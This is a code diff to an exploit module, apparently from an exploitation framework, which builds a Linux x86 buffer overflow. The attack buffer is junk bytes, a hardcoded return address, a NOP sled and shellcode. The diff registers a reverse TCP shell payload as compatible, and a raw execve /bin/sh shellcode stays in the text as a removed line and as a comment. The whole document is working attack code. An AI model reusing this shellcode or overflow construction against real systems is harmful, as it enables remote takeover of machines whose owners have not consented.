@@ -13,7 +13,8 @@ class BoomerModule(PayloadModule):
                 "Arch" : "X86"
                 }
         options = {}
-        super(BoomerModule, self).__init__(options,info)
+        compatible = ["msf/linux/x86/shell_reverse_tcp", "local/linux/open_local_shell"]
+        super(BoomerModule, self).__init__(options,info, compatible)
                
     def check(self):
         try:
@@ -30,11 +31,12 @@ class BoomerModule(PayloadModule):
         nops = b"\x90" * 24
         payload = self.options["payload"][1]
         if not payload:
-            shellcode = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+            self.print_info("Select a payload -> put payload <option>")
+            return
         else:
-            self.print_info("To fix this option.")
+            #TODO
             shellcode = self.payload.get_shellcode()
-            sshellcode = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+            #shellcode = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
         esp = b"\x18\x2e\x0e\x08" 
         buffer = junk + esp + nops + shellcode
         try:
